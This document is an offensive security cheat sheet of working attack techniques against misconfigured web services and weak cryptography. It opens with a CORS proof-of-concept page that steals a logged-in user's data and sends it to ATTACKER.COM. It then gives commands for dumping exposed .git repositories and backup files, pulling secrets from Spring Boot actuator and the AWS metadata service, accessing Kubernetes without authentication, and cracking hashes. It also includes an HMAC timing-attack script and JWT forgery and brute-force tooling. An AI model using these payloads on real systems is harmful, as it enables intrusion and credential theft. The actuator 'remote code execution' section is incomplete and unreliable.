# Attack Techniques — Configuration & Cryptographic Vulnerabilities

## CORS Credential Theft

### PoC HTML Page — CORS Origin Reflection Attack
```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Credential Theft PoC</h1>
<pre id="output">Fetching...</pre>
<script>
const target = 'https://TARGET.COM/api/users/me';

fetch(target, {
    method: 'GET',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' }
})
.then(r => {
    if (!r.ok) {
        document.getElementById('output').textContent = `HTTP ${r.status} — CORS blocked or not vulnerable`;
        return null;
    }
    return r.json();
})
.then(data => {
    if (data) {
        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
        fetch('https://ATTACKER.COM/collect', {
            method: 'POST',
            body: JSON.stringify({ origin: location.origin, data: data }),
        });
    }
})
.catch(err => {
    document.getElementById('output').textContent = 'Error: ' + err.message + ' (CORS blocked)';
});
</script>
</body>
</html>
```

### Verify CORS configuration manually
```bash
# Check if target reflects origin with credentials
curl -s -I \
    -H "Origin: https://attacker.com" \
    -H "Cookie: session=YOUR_VALID_SESSION" \
    "https://TARGET.COM/api/users/me" | grep -i "access-control\|vary"

# Vulnerable output:
# Access-Control-Allow-Origin: https://attacker.com  (reflected)
# Access-Control-Allow-Credentials: true

# Also check null origin (sandboxed iframe bypass)
curl -s -I \
    -H "Origin: null" \
    -H "Cookie: session=YOUR_VALID_SESSION" \
    "https://TARGET.COM/api/users/me" | grep -i "access-control"
```

---

## .git Repository Exposure

### Check if .git is accessible
```bash
curl -s "https://TARGET.COM/.git/HEAD"
# Vulnerable response: ref: refs/heads/main

curl -s "https://TARGET.COM/.git/config"
# Shows remote URL, branch names, author config
```

### Full repository extraction with git-dumper
```bash
pip3 install git-dumper

git-dumper "https://TARGET.COM/.git" ./extracted_repo/

cd extracted_repo/
git log --oneline
git diff HEAD~1
grep -rn "password\|secret\|key\|token\|credential" . --include="*.env" --include="*.py" --include="*.js"
```

### Backup / source file exposure
```bash
BACKUP_EXTENSIONS=("~" ".bak" ".backup" ".old" ".orig" ".save" ".swp" ".tmp" ".copy")
TARGET_FILES=("config.php" "wp-config.php" "database.yml" "settings.py" ".env" "web.config" "application.properties")

for file in "${TARGET_FILES[@]}"; do
    for ext in "${BACKUP_EXTENSIONS[@]}"; do
        URL="https://TARGET.COM/${file}${ext}"
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
        if [ "$STATUS" = "200" ]; then
            echo "FOUND: $URL"
            curl -s "$URL" | head -20
        fi
    done
done
```

---

## Spring Boot Actuator Abuse

### Enumerate available endpoints
```bash
curl -s "https://TARGET.COM/actuator" | python3 -m json.tool
```

### Extract secrets from /actuator/env
```bash
curl -s "https://TARGET.COM/actuator/env" | python3 -c "
import json, sys
env = json.load(sys.stdin)
for source in env.get('propertySources', []):
    for key, val in source.get('properties', {}).items():
        if any(kw in key.lower() for kw in ['password', 'secret', 'key', 'token', 'credential']):
            print(f'{key}: {val.get(\"value\", \"[REDACTED]\")}')
"
```

### Download heap dump
```bash
curl -s "https://TARGET.COM/actuator/heapdump" -o heap.hprof
strings heap.hprof | grep -iE "password|secret|token|key" | head -50
```

### Remote code execution via /actuator/loggers + log injection
```bash
curl -X POST "https://TARGET.COM/actuator/loggers/ROOT" \
    -H "Content-Type: application/json" \
    -d '{"configuredLevel": "TRACE"}'

curl -X POST "https://TARGET.COM/actuator/restart"
```

---

## AWS / Cloud Metadata via Exposed Proxy

### IMDSv1 — Access from SSRF or misconfigured proxy
```bash
curl "https://TARGET.COM/proxy?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET.COM/fetch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://TARGET.COM/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"
# Returns: AccessKeyId, SecretAccessKey, Token
```

---

## Kubernetes Dashboard Without Auth

```bash
curl -sk "https://TARGET.COM:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
curl -sk "https://TARGET.COM:30000/"

kubectl --server=https://TARGET.COM:6443 --insecure-skip-tls-verify get secrets
```

---

## MD5 / SHA1 Password Hash Cracking

### Identify Hash Type
```bash
hash-identifier
> 5f4dcc3b5aa765d61d8327deb882cf99
[+] MD5

# By structure:
# MD5:    32 hex chars        5f4dcc3b5aa765d61d8327deb882cf99
# SHA1:   40 hex chars        5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# SHA256: 64 hex chars        ...
# bcrypt: $2b$12$...
# argon2: $argon2id$v=...
# PBKDF2: pbkdf2_sha256$...
```

### hashcat Attack Modes
```bash
# MD5 — dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5 — with rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# MD5 — brute force (up to 8 chars)
hashcat -m 0 hashes.txt -a 3 '?a?a?a?a?a?a?a?a'

# SHA1 — dictionary
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256 unsalted — dictionary
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# MySQL 4.1+ SHA1(SHA1(password))
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (slow)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --status

# Django PBKDF2-SHA256
hashcat -m 20400 hashes.txt /usr/share/wordlists/rockyou.txt

# Salted MD5
hashcat -m 10 'hash:salt' /usr/share/wordlists/rockyou.txt  # md5($pass.$salt)
hashcat -m 20 'hash:salt' /usr/share/wordlists/rockyou.txt  # md5($salt.$pass)
```

### Rainbow Table Attack
```bash
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
rcrack . -l hashes.txt

# Online lookup:
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
```

---

## Timing Attack — HMAC Comparison

### PoC Script
```python
#!/usr/bin/env python3
"""HMAC Timing Attack PoC — requires high-precision timing and many requests"""
import hmac, hashlib, time, requests, statistics

TARGET_URL = "https://target.com/webhook"
PAYLOAD = b'{"event": "payment", "amount": 100}'

def measure_response_time(signature: str, samples: int = 50) -> float:
    times = []
    for _ in range(samples):
        start = time.perf_counter_ns()
        requests.post(TARGET_URL,
            data=PAYLOAD,
            headers={
                "Content-Type": "application/json",
                "X-Signature": f"sha256={signature}"
            }
        )
        end = time.perf_counter_ns()
        times.append(end - start)
    times.sort()
    trimmed = times[5:-5]
    return statistics.median(trimmed)

def timing_attack():
    recovered = ""
    hex_chars = "0123456789abcdef"

    for position in range(64):  # HMAC-SHA256 = 64 hex chars
        best_char = None
        best_time = 0

        for c in hex_chars:
            candidate = recovered + c
            signature = candidate.ljust(64, '0')
            t = measure_response_time(signature)

            if t > best_time:
                best_time = t
                best_char = c

        recovered += best_char
        print(f"[+] Recovered so far: {recovered}")

    return recovered
```

### Verify the Vulnerability Locally
```python
import time, hmac, hashlib

def vulnerable_verify(received: str, secret: str, payload: bytes) -> tuple:
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    start = time.perf_counter_ns()
    result = (expected == received)
    elapsed = time.perf_counter_ns() - start
    return result, elapsed

secret = "webhook_secret"
payload = b"test payload"
expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

t_correct = [vulnerable_verify(expected[0] + "x" * 63, secret, payload)[1] for _ in range(1000)]
wrong_first = 'b' if expected[0] != 'b' else 'c'
t_wrong = [vulnerable_verify(wrong_first + "x" * 63, secret, payload)[1] for _ in range(1000)]

import statistics
print(f"Time (correct first byte): {statistics.median(t_correct):.1f}ns")
print(f"Time (wrong first byte):   {statistics.median(t_wrong):.1f}ns")
```

---

## ECB Mode Block Analysis

### Visual ECB Pattern Detection
```python
def analyze_ecb_blocks(ciphertext: bytes) -> dict:
    block_size = 16
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]

    block_counts = {}
    for block in blocks:
        block_hex = block.hex()
        block_counts[block_hex] = block_counts.get(block_hex, 0) + 1

    repeated = {k: v for k, v in block_counts.items() if v > 1}
    return repeated

# Repeated blocks in ciphertext → ECB mode confirmed
```

### ECB Block Rearrangement Attack
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY = get_random_bytes(16)

def encrypt_profile(email: str) -> bytes:
    profile = f"email={email}&role=user&admin=false"
    data = profile.encode()
    pad = 16 - (len(data) % 16)
    data += bytes([pad] * pad)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(data)

# Craft input so "admin=true" lands on its own block boundary
# Then swap ciphertext blocks to forge admin=true without knowing the key
```

---

## Known-Weak JWT Secrets Wordlist

```
secret
password
123456
admin
test
jwt
jwt_secret
mysecret
app_secret
session_secret
your-256-bit-secret
your-secret-key
change_me
changeme
development
production
test_secret
secret_key
private_key
key
token
jwt_token
jwttoken
apikey
api_key
supersecret
topsecret
shhh
s3cr3t
p@ssw0rd
P@ssw0rd
Passw0rd
SecretKey
MySecretKey
JWTSecret
JWT_SECRET
APP_SECRET
SECRET_KEY
flask-secret
django-insecure
rails-secret
DJANGO_SECRET_KEY
FLASK_SECRET_KEY
express-secret
node-secret
spring-secret
HS256KEY
RS256KEY
abcdefg
1234567890
qwerty
letmein
password123
admin123
root
toor
master
default
example
demo
dev
staging
prod
production123
```

```bash
# Crack JWT with hashcat
hashcat -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.TARGET_JWT" jwt_secrets.txt
```

---

## JWT None Algorithm Bypass

### Manual Payload Crafting
```bash
python3 -c "
import base64, json

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

for alg in ['none', 'None', 'NONE', 'nOnE']:
    header = b64url({'alg': alg, 'typ': 'JWT'})
    payload = b64url({'sub': '1234', 'role': 'admin', 'exp': 9999999999})
    print(f'{alg}: {header}.{payload}.')
"
```

### jwt_tool Usage
```bash
pip3 install jwt_tool

# Test all known attacks automatically
python3 jwt_tool.py TOKEN -t https://target.com/api/endpoint -rh "Authorization: Bearer TOKEN" -M at

# Algorithm confusion attack
python3 jwt_tool.py TOKEN -X a

# None algorithm
python3 jwt_tool.py TOKEN -X n

# Brute force key
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Tamper payload
python3 jwt_tool.py TOKEN -T
```
